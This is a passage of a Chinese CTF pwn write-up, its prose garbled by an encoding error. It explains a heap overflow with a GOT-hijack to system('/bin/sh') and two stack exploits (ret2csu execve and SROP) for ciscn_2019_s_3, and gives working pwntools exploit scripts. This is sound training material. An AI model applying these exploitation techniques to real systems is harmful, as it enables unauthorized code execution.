</span></span></code></pre></div><p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨å¯èƒ½å­˜åœ¨æ¼æ´çš„ <code>add</code> å’Œ <code>update</code>ï¼Œé¦–å…ˆæ˜¯ <code>add</code>ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_DWORD</span> <span class=o>*</span><span class=kr>__cdecl</span> <span class=nf>add</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>desc</span><span class=p>;</span> <span class=c1>// ST24_4
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span> <span class=c1>// ST28_4
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>desc</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>desc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>user</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x80u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>user</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x80u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>user</span> <span class=o>=</span> <span class=n>desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>users</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span><span class=p>]</span> <span class=o>=</span> <span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;name:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read_name</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span><span class=p>]</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>124</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>update</span><span class=p>(</span><span class=o>++</span><span class=n>total_users</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>è¿™é‡Œå¯ä»¥å¤§è‡´äº†è§£åˆ° <code>user</code> ç»“æ„ä½“å¤§çº¦é•¿è¿™æ ·ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>user</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>description</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>124</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>æ³¨æ„ <code>descrption</code> æ˜¯ <code>user</code> å¼€å§‹çš„åœ°æ–¹ã€‚</p><p>éšåå‘ç° <code>update</code> ä¸­å­˜åœ¨ä¸€å¤„é˜²æŠ¤æªæ–½ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_8048724</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+17h] [ebp-11h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>len</span><span class=p>;</span> <span class=c1>// [esp+18h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span> <span class=o>&amp;&amp;</span> <span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;text length:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%u%c&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>len</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>len</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>])</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>-</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;my l33t defenses cannot be fooled, cya!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;text:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_name</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>],</span> <span class=n>len</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>è¿™é‡Œå…¶å®æ˜¯åˆ¤æ–­å½“å‰ <code>user->description</code> åŠ ä¸Šè¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¼šè¶…è¿‡ <code>user</code> èµ·å§‹åœ°å€ - 4 çš„ä½ç½®ï¼Œç›®çš„å¾ˆæ˜æ˜¾æ˜¯ä¸ºäº†é˜²æ­¢å †æº¢å‡ºã€‚é¢„æœŸå†…å­˜å¸ƒå±€æ˜¯ï¼š</p><pre tabindex=0><code> --------
| Desc0  |
 -------- &lt;- user0
| &amp;Desc0 |
 --------
| name0  |
 --------
| Desc1  |
 -------- &lt;- user1
| &amp;Desc1 |
 --------
| name1  |
 --------
| Desc2  |
 -------- &lt;- user2
| &amp;Desc2 |
 --------
| name2  |
 --------
</code></pre><p>ç„¶è€Œï¼Œæˆ‘ä»¬è¿˜æ‹¥æœ‰åˆ é™¤ç”¨æˆ·çš„åŠŸèƒ½ã€‚å‡å¦‚æˆ‘ä»¬åˆ é™¤ç¬¬ 0 ä¸ªç”¨æˆ·ï¼Œé‚£ä¹ˆä»–æ‹¥æœ‰çš„ç©ºé—´å°±è¢« <code>free()</code> äº†ã€‚è¿™æ—¶æˆ‘ä»¬æ–°å¢ç”¨æˆ·ï¼Œç”±äº <code>desc</code> é•¿åº¦å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶é•¿åº¦è®©å®ƒæ°å¥½åˆ†é…åˆ°åŸæ¥ç¬¬ 0 ä¸ªç”¨æˆ·çš„ç©ºé—´ï¼Œä» <code>Desc0</code> ä¸€ç›´åˆ° <code>name0</code> ç»“æŸã€‚é‚£ä¹ˆæ­¤æ—¶ï¼š</p><pre tabindex=0><code> --------
|        |
|        |
| Desc3  |
|        |
|        |
 --------
| Desc1  |
 -------- &lt;- user1
| &amp;Desc1 |
 --------
| name1  |
 --------
| Desc2  |
 -------- &lt;- user2
| &amp;Desc2 |
 --------
| name2  |
 -------- &lt;- user3
| &amp;Desc3 |
 --------
| name3  |
 --------
</code></pre><p>ä¸éš¾å‘ç°ï¼Œå³ä½¿æœ‰ä¸Šè¿°é˜²æŠ¤æªæ–½çš„é™åˆ¶ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥æº¢å‡ºåˆ° <code>user1</code> å¹¶è¦†ç›–å…¶ä¸­æ•°æ®ã€‚å¦‚æœæŠŠ libc ä¸­å‡½æ•°çš„ GOT è¡¨åœ°å€æ”¾è¿›å»ï¼Œç„¶å <code>display</code> å‡½æ•°æ‰“å°å‡ºæ¥ï¼Œå°±èƒ½æ³„éœ² libc åœ°å€ã€‚ç„¶åè¿›è¡Œ GOT åŠ«æŒå³å¯ getshellã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šå›¾ä¸­ <code>Desc1</code> å‰å’Œ <code>&amp;Desc1</code> å‰éƒ½æœ‰ 8 å­—èŠ‚ chunk headerï¼Œè¦†ç›–æ—¶éœ€è¦è€ƒè™‘å®ƒä»¬å çš„ 16Bã€‚æ­¤å¤–ï¼Œ<code>Desc0+user0</code> åŸæœ¬æ‰€å çš„ç©ºé—´å®é™…ä¸Šæ˜¯ <code>0x8+0x80+0x8+0x80</code>ï¼Œè€Œ <code>Desc3</code> ç”³è¯· <code>0x100</code> å­—èŠ‚æ—¶å®é™…å  <code>0x8+0x100</code>ï¼Œå‰è€…æ¯”åè€…å¤šå‡ºç©ºé—²çš„ <code>0x8</code> å­—èŠ‚ï¼Œä¹Ÿéœ€è¦è€ƒè™‘ã€‚å› æ­¤è®¡ç®—åç§» <code>0x100+0x8+0x8+0x80+0x8=0x198</code>ã€‚</p><p>æ”¾ä¸Š <code>0x198</code> å­—èŠ‚çš„ padding åï¼Œå°±å¯ä»¥æŠŠ <code>free</code> çš„ GOT åœ°å€æ”¾åœ¨ <code>&amp;Desc1</code> å¤„ï¼Œæ­¤æ—¶æ‰“å°å‡ºæ¥çš„å°±æ˜¯ <code>free</code> çš„ GOT åœ°å€ï¼Œä»è€Œæ³„éœ²å‡º libcã€‚è¿™æ—¶å†åˆ©ç”¨æ›´æ–°åŠŸèƒ½ç”¨ <code>system.plt</code> è¦†ç›– <code>free.got</code>ï¼Œé‚£ä¹ˆæ‰§è¡Œ <code>free</code> æ—¶å°±ä¼šæ‰§è¡Œ <code>system</code>ã€‚æ­¤æ—¶è¿˜å·®ä¸€ä¸ªå‚æ•° <code>/bin/sh</code>ï¼Œæˆ‘ä»¬ä¸å¦¨æ”¾åœ¨ <code>Desc2</code> å¤„ï¼Œé‚£ä¹ˆåœ¨åˆ é™¤ <code>user2</code> æ—¶ï¼Œæœ‰æºç ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>delete</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span> <span class=o>&amp;&amp;</span> <span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>è¿™é‡Œå°±ä¼šæ‰§è¡Œ <code>free(address of /bin/sh)</code>ï¼Œå®é™…ä¸Šå°±æ˜¯ <code>system('/bin/sh')</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>max_len</span><span class=p>,</span> <span class=n>desc_len</span><span class=p>,</span> <span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;description:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>max_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>,</span> <span class=s1>&#39;aaaa&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;length:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>desc_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;text:&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>display</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>update</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>desc_len</span><span class=p>,</span> <span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;length:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>desc_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;text:&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span><span class=mh>0x19c</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x198</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>display</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;tion:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;free&#39;</span><span class=p>,</span><span class=n>free</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>free</span><span class=p>,</span><span class=s1>&#39;free&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_s_3 class="relative group">ciscn_2019_s_3 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_s_3 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜ä»£ç å¾ˆå°‘ï¼Œæ³¨æ„åˆ° <code>gadgets</code> å‡½æ•°ä¸­æœ‰ <code>mov rax, 0Fh</code> å’Œ <code>mov rax, 3Bh</code> å¯ä»¥æ§åˆ¶ <code>rax</code>ï¼Œå®ƒä»¬æ°å¥½åˆ†åˆ«å¯¹åº”ç³»ç»Ÿè°ƒç”¨ <code>sigreturn</code> å’Œ <code>execve</code>ã€‚å› æ­¤æœ¬é¢˜å¯ä»¥å›´ç»•è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ç»™å‡ºä¸¤ç§åšæ³•ã€‚</p><p>æ¯”è¾ƒéš¾çš„åšæ³•æ˜¯åˆ©ç”¨ <code>execve</code>ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ <code>execve('/bin/sh',0,0)</code>ï¼Œé‚£ä¹ˆè¿˜éœ€è¦æ§åˆ¶ <code>rdi,rsi,rdx</code>ã€‚è¿™é‡Œéœ€è¦å‡ ä¸ª gadgetsï¼Œä½†æ˜¯ <code>gadgets</code> å‡½æ•°ä¸­çš„ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥å¯ä»¥ <code>ret2csu</code>ã€‚<code>/bin/sh</code> éœ€è¦æˆ‘ä»¬è‡ªå·±å†™ï¼Œä½†åªèƒ½å†™åˆ°æ ˆä¸Šï¼Œå› æ­¤éœ€è¦é€šè¿‡ <code>write</code> æ³„éœ²æ ˆåœ°å€ã€‚</p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä½äº <code>rbp-0x10</code>ï¼Œé‚£ä¹ˆå¡«å…… 16 å­—èŠ‚åå¡«å…… <code>main</code> å‡½æ•°åœ°å€å³å¯é‡å¯ç¨‹åºåŒæ—¶æ³„éœ²æ ˆåœ°å€ï¼Œgdb è°ƒè¯•å¯çŸ¥æ³„éœ²ä½ç½®è·ç¦»æˆ‘ä»¬çš„è¾“å…¥åç§»é‡ä¸º <code>0x118</code> å­—èŠ‚ã€‚</p><p>æœ€ååœ¨æ ˆä¸Šå¸ƒç½®å¥½ <code>/bin/sh</code> å­—ç¬¦ä¸²å’Œ <code>pop_rdi</code> çš„ gadgetï¼Œå‡†å¤‡å¥½ <code>rax</code>ï¼Œè¿”å›åˆ° csu æœ«å°¾ç¡®ä¿ <code>rbx=0</code> ä¸” <code>rbp=1</code>ï¼Œå°†æ ˆä¸Š <code>pop rdi</code> çš„åœ°å€ç»™ <code>r12</code> ä»¥ä¾¿è°ƒç”¨ï¼Œéšåè®¾ç½® <code>rsi,rdx</code> ä¸º 0ï¼Œæœ€åå°† <code>/bin/sh</code> çš„åœ°å€ç»™ <code>rdi</code>ï¼Œè°ƒç”¨ <code>syscall</code> å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x400517</span>
</span></span><span class=line><span class=cl><span class=n>mov_rax_3b</span> <span class=o>=</span> <span class=mh>0x4004e2</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x4005a3</span>
</span></span><span class=line><span class=cl><span class=n>csu_1</span> <span class=o>=</span> <span class=mh>0x400580</span>
</span></span><span class=line><span class=cl><span class=n>csu_2</span> <span class=o>=</span> <span class=mh>0x40059a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span><span class=o>-</span><span class=mh>0x118</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>,</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>mov_rax_3b</span><span class=p>,</span><span class=n>csu_2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>stack</span><span class=o>-</span><span class=mh>0x18</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>csu_1</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>stack</span><span class=o>-</span><span class=mh>0x20</span><span class=p>,</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>ç¬¬äºŒç§æ–¹æ³•åˆ™æ˜¯ SROPã€‚æˆ‘ä»¬åˆ©ç”¨ <code>mov rax, 0Fh</code> æ§åˆ¶ <code>rax</code> ä¸º 15ï¼Œéšåè°ƒç”¨ <code>syscall</code>ï¼Œç›¸å½“äºæ‰§è¡Œäº†ä¸€æ¬¡ <code>sigreturn</code>ã€‚å¯ä»¥ä¼ªé€  sigreturn frame æ¥æ‰§è¡Œ <code>execve('/bin/sh',0,0)</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x400517</span>
</span></span><span class=line><span class=cl><span class=n>mov_rax_0f</span> <span class=o>=</span> <span class=mh>0x4004da</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;vuln&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span><span class=o>-</span><span class=mh>0x118</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>,</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rax</span> <span class=o>=</span> <span class=n>constants</span><span class=o>.</span><span class=n>SYS_execve</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>stack</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>stack</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>syscall</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>2</span><span class=p>,</span><span class=n>mov_rax_0f</span><span class=p>,</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
